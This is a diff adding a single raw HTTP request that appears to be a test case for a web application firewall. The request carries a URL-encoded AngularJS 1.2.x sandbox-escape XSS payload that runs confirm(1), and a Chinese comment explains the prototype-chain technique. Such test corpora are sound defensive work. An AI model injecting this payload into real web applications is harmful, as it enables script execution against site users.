@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_框架_AngularJS-06506751
+# 利用了函数的 call 方法和 JavaScript 的原型链访问来执行恶意代码。（1.2.6 - 1.2.18）
+GET /?id=%7B%7B%28_=%27%27.sub%29.call.call%28%7B%7D%5B$=%27constructor%27%5D.getOwnPropertyDescriptor%28_.__proto__%2C$%29.value%2C0%2C%27confirm%281%29%27%29%28%29%7D%7D&bid=hd_tag_m8mv25e0 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25e0
+RM-PRO-Token: 90f62e301cf004d4ebaee9fab77c8131
+RM-PRO-Time: 1742808463200
+User-Agent: curl/7.83.1
+
